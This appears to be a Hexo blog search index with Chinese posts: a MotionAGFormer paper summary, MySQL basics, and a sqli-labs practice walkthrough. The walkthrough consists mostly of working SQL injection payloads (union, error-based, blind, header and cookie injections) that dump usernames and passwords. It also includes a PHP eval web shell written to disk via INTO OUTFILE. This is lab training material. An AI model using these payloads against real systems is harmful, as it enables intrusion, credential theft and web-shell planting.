MetaFormer将各个身体关节处理为不同的标记，有效地捕获单个帧内的帧内关系。另一方面，Temporal MetaFormer将每个帧视为单个令牌，从而捕获随时间推移的帧间关系。这两个流之间的关键区别在于它们的令牌混合器类型。当一个流使用Transformer时，另一个流使用GCNFormers。</p><p><strong>Transformer流</strong>该流采用空间多头自注意（S-MHSA）来捕获空间关系，随后采用时间多头自注意（T-MHSA）来捕获时间关系。S-MHSA定义为：<br><img src="/2024/05/07/motionAGFormer/S-MHSA.png"></p><p>其中Ws（0）是投影参数矩阵，h是并行注意头部的数量，dk是Ks的特征维度。为了计算查询矩阵Qs、键矩阵Ks和值矩阵Vs，有：<br><img src="/2024/05/07/motionAGFormer/%E5%A4%9A%E6%9C%89%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6%E5%8F%82%E6%95%B0.png"></p><p>其中Fs ∈ RBT × J × d是空间特征，Ws（Q，i），Ws（K，i），Ws（V，i）是投影矩阵，B是批量大小。S—MHSA结果随后被馈送到多层感知器（MLP）中，然后是残差连接和LayerNorm。这完成了第一个MetaFormer，即空间Transformer。然后，将Fs重新整形为FT ∈ RBJ × T × d，以准备每个联合的时间特征作为T—MHSA的输入。这里有：</p><p><img src="/2024/05/07/motionAGFormer/T-MHSA.png"></p><p><strong>GCNFormer流</strong>与聚合全局信息的Transformer流不同，GCNFormer流关注骨架序列中存在的局部空间和时间关系。虽然局部信息也可用于变压器，但包含这种并行流允许模型更有效地平衡局部和全局信息的整合。在文中的GCNFormer中使用的定制GCN模块定义为：</p><p><img src="/2024/05/07/motionAGFormer/GCNFormer.png"></p><p>其中，A &#x3D; A + IN表示添加了自连接的邻接矩阵，IN表示单位矩阵，D ii &#x3D; j Ajj定义为沿A的对角线沿着的元素之和，W1、W2表示特定于每层的可训练权重矩阵。激活函数σ（·），如ReLU，与批次归一化一起应用。然后，GCN的输出通过MLP，然后是剩余连接和LayerNorm。</p><p>空间GCNFormer和时间GCNFormer之间的区别在于它们的邻接矩阵和输入特征。输入要素类似于Transformer流的要素。在Spatial GCNFormer中，邻接矩阵表示人体拓扑（图3a）。另一方面，对于时间GCNFormer，我们使用Sim（FT ti，FT tj）&#x3D;（FT ti）TFT tj计算不同时间帧处单个关节之间的相似性，并选择K个最近邻居作为图中的连接节点（图3b）。因此，Temporal GCNFormer中的图形拓扑由学习的节点特征确定。<br><img src="/2024/05/07/motionAGFormer/GCNFormer%20module.png"><br><strong>图3</strong></p><p>GCNFormer模块拓扑。(a)空间GCNFormer采用人体骨架作为其底层拓扑结构。(b)时间GCNFormer通过考虑每个关节的最高相似性（例如，图中的左手腕和右脚踝）。在K—NN之后，每行连接到K列。</p><p><strong>自适应融合</strong>与MotionBERT类似，文章使用自适应融合来聚合Transformer和GCNFormer流的提取特征。其定义为：<br><img src="/2024/05/07/motionAGFormer/%E8%87%AA%E9%80%82%E5%BA%94%E8%9E%8D%E5%90%88.png"></p><p>其中，F（i）表示在深度i处提取的特征嵌入，按元素乘法由表示，并且FTF（i-1）、FGF（i-1）分别指在深度i-1处提取的Transformer流和GCNFormer流特征。自适应融合权值αTF和αGF分别定义为：<br><img src="/2024/05/07/motionAGFormer/%E8%87%AA%E9%80%82%E5%BA%94%E8%9E%8D%E5%90%88%E6%9D%83%E5%80%BC.png"><br>其中W是可学习的线性变换。</p><p><strong>评估标准</strong><br>Human3.6M<br>使用两个协议进行评估。第一个协议（称为P1）在对齐根关节（骶骨）后，在估计姿势和实际姿势之间使用以毫米为单位的平均每关节位置误差（MPJPE）。第二协议（称为P2）测量Procrustes-MPJPE，其中实际姿态和估计姿态通过刚性变换对准。</p><p>MPI-INF-3DHP<br>MPJPE，150 mm范围内正确关键点（PC）的百分比和曲线下面积（AUC）被报告为评估指标。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sqi</title>
    <link href="/2022/03/31/sqi/"/>
    <url>/2022/03/31/sqi/</url>
    
    <content type="html"><![CDATA[<p>sqlimap思维导图<br><img src="/2022/03/31/sqi/sqlmap.jpg"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sqli</title>
    <link href="/2022/03/25/sqli/"/>
    <url>/2022/03/25/sqli/</url>
    
    <content type="html"><![CDATA[<p>第一关</p><p>?id&#x3D;1 (回显正常)<br>?id&#x3D;1’回显错误) 可以判断出是基于单引号注入然后and判断一下<br>?id&#x3D;1’and 1&#x3D;1 (回显正常)<br>?id&#x3D;1’and 1&#x3D;2 回显错误证明存在注入漏洞<br>则or 相反<br>?id&#x3D;1’or 1&#x3D;2 –+ （回显正常）<br>?id&#x3D;1’or 1&#x3D;1 –+ （回显错误，证明存在注入漏洞）<br>然后我们判断一下列数<br>?id&#x3D;1’ order by 3 –+（没报错）<br>?id&#x3D;1’ order by 4 –+ （报错）<br>联合查询一下<br>?id&#x3D;1’and 1&#x3D;2 union select 1,2,3 –+<br>基于上述的简单联合查询<br>进行爆表<br>?id&#x3D;1’and 1&#x3D;2 union select 1,group_concat(schema_name),3 from information_schema.schemata –+<br>基于上述进行爆表进行爆security库内的表<br>?id&#x3D;1’and 1&#x3D;2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;”security” –+<br>?id&#x3D;1’and 1&#x3D;2 union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;”users” –+<br>爆字段里面的数据<br>?id&#x3D;1’and 1&#x3D;2 union select 1,group_concat(username,0x5c,password),3 from  users –+<br>第三关<br>?id&#x3D;1 (回显正常)<br>?id&#x3D;1’(回显错误)<br>?id&#x3D;1”(回显正常) 输入单引号页面异常，输入双引号页面正常显示。但是从回显的信息看来，它是由’)来进行闭合的，所以我们尝试输入’)进行闭合再输入–+注释掉后面的代码，结果显示页面正常显示。由此可推出参数是’)进行闭合的！此时可以输入and 1&#x3D;1 和and 1&#x3D;2来比较<br>查看当前数据库名和当前数据库版本<br>?id&#x3D;1’) and 1&#x3D;1 –+<br>?id&#x3D;1’) and 1&#x3D;2 –+<br>?id&#x3D;1’) order by 3 –+<br>?id&#x3D;1’) order by 4 –+<br>?id&#x3D;1’) and 1&#x3D;2 union select 1,2,3 –+<br>?id&#x3D;1’) and 1&#x3D;2 union select 1,database(),version()–+<br>通过information_schema数据库中的tables表来查询当前数据库的所有表<br>?id&#x3D;1’) and 1&#x3D;2 union select 1,table_name,3 from information_schema.tables where table_schema&#x3D;database() limit 0,1 –+<br>?id&#x3D;1’) and 1&#x3D;2 union select 1,table_name,3 from information_schema.tables where table_schema&#x3D;database() limit 1,1 –+<br>?id&#x3D;1’) and 1&#x3D;2 union select 1,table_name,3 from information_schema.tables where table_schema&#x3D;database() limit 2,1 –+<br>?id&#x3D;1’) and 1&#x3D;2 union select 1,table_name,3 from information_schema.tables where table_schema&#x3D;database() limit 3,1 –+<br>查询一下这张表有什么字段<br>?id&#x3D;1’) and 1&#x3D;2 union select 1,column_name,3 from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’ limit 0,1 –+<br>?id&#x3D;1’) and 1&#x3D;2 union select 1,column_name,3 from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’ limit 1,1 –+<br>?id&#x3D;1’) and 1&#x3D;2 union select 1,column_name,3 from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’ limit 2,1 –+<br>获得表的所有信息<br>?id&#x3D;1’) and 1&#x3D;2 union select 1,username,password from users limit 0,1 –+</p><p>Less4<br>id&#x3D;-1”) union select 1,2,database()–<br>id&#x3D;-1”) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’–+<br>id&#x3D;-1”) union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’–+<br>id&#x3D;-1”) union select 1,2,group_concat(username,’-‘,password) from security.users–+</p><p>less5<br>基于’ 字符的错<br>id&#x3D;1’ union select updatexml(1,concat(0x7e,(select user()),0x7e),1) – -</p><p>less6<br>基于”字符的错<br>id&#x3D;1” union select updatexml(1,concat(0x7e,(select user()),0x7e),1) – -</p><p>less7<br>1’)) union select 1,’<?php eval($_REQUEST[23]); ?>‘,3 into outfile ‘D:&#x2F;&#x2F;1.php’ – -</p><p>less8<br>基于’布尔盲注<br>判断数据库名长度：id&#x3D;1’ and length(database())&gt;7–+<br>id&#x3D;1’ and ascii(substr(database(),1,1))&gt;100–+</p><p>id&#x3D;1’ and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;’security’ limit 0,1),1,1))&gt;100–+</p><p>id&#x3D;1’ and ascii(substr((select column_name from information_schema.columns where table_name&#x3D;’users’ limit 0,1),1,1))&gt;100–+</p><p>id&#x3D;1’ and ascii(substr((select password from security.users limit 0,1),1,1))&gt;100–+</p><p>less9<br>基于’字符的时间盲注<br>判断数据库名长度：id&#x3D;1’ and if(length(database())&gt;7, 0, sleep(5))–+<br>id&#x3D;1’ and if(ascii(substr(database(),1,1))&gt;100, 0, sleep(5))–+</p><p>id&#x3D;1’ and if(ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;’security’ limit 0,1),1,1))&gt;100, 0, sleep(5))–+</p><p>id&#x3D;1’ and if(ascii(substr((select column_name from information_schema.columns where table_name&#x3D;’users’ limit 0,1),1,1))&gt;100, 0, sleep(5))–+</p><p>id&#x3D;1’ and if(ascii(substr((select password from security.users limit 0,1),1,1))&gt;100, 0, sleep(5))–+</p><p>less10<br>基于”字符的时间盲注<br>判断数据库名长度：id&#x3D;1” and if(length(database())&gt;8, 0, sleep(5))–+</p><p>id&#x3D;1” and if(ascii(substr(database(),1,1))&gt;100, 0, sleep(5))–+</p><p>id&#x3D;1” and if(ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;’security’ limit 0,1),1,1))&gt;100, 0, sleep(5))–+</p><p>id&#x3D;1” and if(ascii(substr((select column_name from information_schema.columns where table_name&#x3D;’users’ limit 0,1),1,1))&gt;100, 0, sleep(5))–+</p><p>id&#x3D;1” and if(ascii(substr((select password from security.users limit 0,1),1,1))&gt;100, 0, sleep(5))–+</p><p>less11<br>post注入<br>-admin’ union select 1,database()– -</p><p>-admin’ union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’– -</p><p>-admin’ union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’– -</p><p>-admin’ union select 1,group_concat(username,’-‘,password) from security.users– -</p><p>less12<br>“）post注入<br>-admin”) union select 1,database()– -</p><p>-admin”) union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’– -</p><p>-admin”) union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’– -</p><p>-admin”) union select 1,group_concat(username,’-‘,password) from security.users– -</p><p>less13<br>‘)报错注入</p><p>admin’) union select updatexml(1,concat(0x7e,(database()),0x7e),1) – -</p><p>admin’) union select updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’),0x7e),1)– -</p><p>admin’) union select updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’),0x7e),1)– -</p><p>admin’) union select updatexml(1,concat(0x7e,(select group_concat(username,’-‘,password) from security.users),0x7e),1)– -</p><p>less14<br>“的报错注入<br>admin” union select updatexml(1,concat(0x7e,(database()),0x7e),1) – -</p><p>admin” union select updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’),0x7e),1)– -</p><p>admin” union select updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’),0x7e),1)– -</p><p>admin” union select updatexml(1,concat(0x7e,(select group_concat(username,’-‘,password) from security.users),0x7e),1)– -</p><p>less15<br>post时间注入<br>admin’ and if(length(database())&gt;7, 0, sleep(5))– -<br>暴库payload：admin’ and if(ascii(substr(database(),1,1))&gt;100, 0, sleep(5))– -</p><p>admin’ and if(ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;’security’ limit 0,1),1,1))&gt;100, 0, sleep(5))– -</p><p>admin’ and if(ascii(substr((select column_name from information_schema.columns where table_name&#x3D;’users’ limit 0,1),1,1))&gt;100, 0, sleep(5))– -</p><p>admin’ and if(ascii(substr((select password from security.users limit 0,1),1,1))&gt;100, 0, sleep(5))– -</p><p>less16<br>post时间注入<br>判断数据库名长度：admin”) and if(length(database())&gt;8, 0, sleep(5))– -</p><p>admin”) and if(ascii(substr(database(),1,1))&gt;100, 0, sleep(5))– -</p><p>admin”) and if(ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;’security’ limit 0,1),1,1))&gt;100, 0, sleep(5))– -</p><p>admin”) and if(ascii(substr((select column_name from information_schema.columns where table_name&#x3D;’users’ limit 0,1),1,1))&gt;100, 0, sleep(5))– -</p><p>admin”) and if(ascii(substr((select password from security.users limit 0,1),1,1))&gt;100, 0, sleep(5))– -</p><p>less17<br>‘的post报错注入<br>admin’ and updatexml(1,concat(0x7e,(select database()),0x7e),1)– -</p><p>admin’ and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’),0x7e),1)– -</p><p>admin’ and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’),0x7e),1)– -</p><p>admin’ and  updatexml(1,concat(0x7e,(select password from (select password from users where username&#x3D;’admin’) mingzi ),0x7e),1)– -</p><p>less18<br>用Burp抓取输入正确用户密码的登录页面,然后在报头文User-Agent:后加入注入语句<br>‘,1,updatexml(1,concat(0x7e, database(),0x7e),1))#</p><p>‘,1,updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’),0x7e),1))#</p><p>‘,1,updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’),0x7e),1))#</p><p>‘,1,updatexml(1,concat(0x7e,(select group_concat(username,’-‘,password) from security.users),0x7e),1))#</p><p>less19<br>报头注入<br>用Burp抓取输入正确用户密码的登录页面,然后在报头文Referer:后加入注入语句<br>‘,1,updatexml(1,concat(0x7e, database(),0x7e),1))#</p><p>‘,1,updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’),0x7e),1))#</p><p>‘,1,updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’),0x7e),1))#</p><p>‘,1,updatexml(1,concat(0x7e,(select group_concat(username,’-‘,password) from security.users),0x7e),1))#</p><p>less20<br>基于’的Cookie:报头文报错注入<br>用Burp抓取输入正确用户密码的登录页面,然后在报头文Cookie:后加入注入语句<br>uname&#x3D;-admin’ union select 1,2,database()–+</p><p>uname&#x3D;-admin’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’ –+</p><p>uname&#x3D;-admin’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’–+</p><p>uname&#x3D;-admin’ union select 1,2,group_concat(username,’-‘,password) from security.users–+</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>mysqlnote</title>
    <link href="/2022/03/17/mysql-note/"/>
    <url>/2022/03/17/mysql-note/</url>
    
    <content type="html"><![CDATA[<p>数据库: 数据库是一些关联表的集合。<br>数据表: 表是数据的矩阵。在一个数据库中的表看起来像一个简单的电子表格。<br>列: 一列(数据元素) 包含了相同类型的数据, 例如邮政编码的数据。<br>行：一行（&#x3D;元组，或记录）是一组相关的数据，例如一条用户订阅的数据。<br>冗余：存储两倍数据，冗余降低了性能，但提高了数据的安全性。<br>主键：主键是唯一的。一个数据表中只能包含一个主键。你可以使用主键来查询数据。<br>外键：外键用于关联两个表。<br>复合键：复合键（组合键）将多个列作为一个索引键，一般用于复合索引。<br>索引：使用索引可快速访问数据库表中的特定信息。索引是对数据库表中一列或多列的值进行排序的一种结构。类似于书籍的目录。<br>参照完整性: 参照的完整性要求关系中不允许引用不存在的实体。与实体完整性是关系模型必须满足的完整性约束条件，目的是保证数据的一致性。</p><p>2.Mysql用户设置</p><p>root@host# mysql -u root -p<br>Enter password:*******<br>mysql&gt; use mysql;<br>Database changed</p><p>mysql&gt; INSERT INTO user<br>          (host, user, password,<br>           select_priv, insert_priv, update_priv)<br>           VALUES (‘localhost’, ‘guest’,<br>           PASSWORD(‘guest123’), ‘Y’, ‘Y’, ‘Y’);<br>Query OK, 1 row affected (0.20 sec)</p><p>mysql&gt; FLUSH PRIVILEGES;<br>Query OK, 1 row affected (0.01 sec)</p><p>mysql&gt; SELECT host, user, password FROM user WHERE user &#x3D; ‘guest’;<br>+———–+———+——————+<br>| host      | user    | password         |<br>+———–+———+——————+<br>| localhost | guest | 6f8c114b58f2ce9e |<br>+———–+———+——————+<br>1 row in set (0.00 sec)</p><p>PHP脚本链接mysql<br>语法：mysqli_connect(host, username, password, dbname,port, socket);<br>参数说明：</p><p>参数    描述<br>host    可选。规定主机名或 IP 地址。<br>username    可选。规定 MySQL 用户名。<br>password    可选。规定 MySQL 密码。<br>dbname    可选。规定默认使用的数据库。<br>port    可选。规定尝试连接到 MySQL 服务器的端口号。<br>socket    可选。规定 socket 或要使用的已命名 pipe。</p><p>连接Mysql<br>&lt;?php<br>$dbhost &#x3D; ‘localhost’;  &#x2F;&#x2F; mysql服务器主机地址<br>$dbuser &#x3D; ‘root’;            &#x2F;&#x2F; mysql用户名<br>$dbpass &#x3D; ‘123456’;          &#x2F;&#x2F; mysql用户名密码<br>$conn &#x3D; mysqli_connect($dbhost, $dbuser, $dbpass);<br>if(! $conn )<br>{<br>    die(‘Could not connect: ‘ . mysqli_error());<br>}</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
